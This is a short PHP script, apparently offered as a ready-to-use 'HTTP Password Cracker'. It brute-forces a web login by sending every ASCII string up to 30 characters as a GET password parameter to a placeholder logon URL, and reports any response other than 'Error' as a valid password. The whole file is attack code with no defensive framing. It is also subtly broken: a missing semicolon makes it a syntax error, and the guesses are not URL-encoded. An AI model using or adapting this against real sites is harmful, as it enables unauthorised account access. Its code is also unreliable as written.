<?php

// PHP HTTP Password Cracker

// The range of characters to use; 127 for ASCII
$num_chars=127;

// Define the base URL to attack
$urlstr="http://www.server.com/logon.php?pw=";

// Define maximum length of strings to generate
$strlen=30;

// Define error message given when password doesn't work
$pwerr="Error"
// Begin program
$ord_arr=array(0);
$str="";
while (sizeof($ord_arr) < $strlen) {
	$str="";
	for ($i=0; $i<sizeof($ord_arr); $i++) {
		$str .= chr($ord_arr[$i]);
	}
	$pwf=fopen($urlstr . $str , 'rb');
	$pwstr=fgets($pwf, 4096);
	fclose($pwf);
	if ($pwstr != $pwerr)
		echo "String '" . $str . "' works as password\n";
	if ($ord_arr[sizeof($ord_arr)-1] == $num_chars) {
		$reset=true;
		for ($i=0; $i<sizeof($ord_arr); $i++) {
			if ($ord_arr[$i] != $num_chars) {
				$reset=false;
			}
		}
		if ($reset) {
			echo "Exhausted " . sizeof($ord_arr) . " character space\n";
			for ($i=0; $i<sizeof($ord_arr); $i++) {
				$ord_arr[$i]=0;
			}
			$ord_arr[]=0;
		} else {
			$incremented=false;
			for ($i=sizeof($ord_arr)-1; $i>=0; $i--) {
				if ($ord_arr[$i] == $num_chars && $incremented == false) {
					$ord_arr[$i]=0;
				}
				else if ($ord_arr[$i] != $num_chars && $incremented == false) {
					$ord_arr[$i]++;
					$incremented=true;
				}
			}
		}
	} else {
		$ord_arr[sizeof($ord_arr)-1]++;
	}
}

?>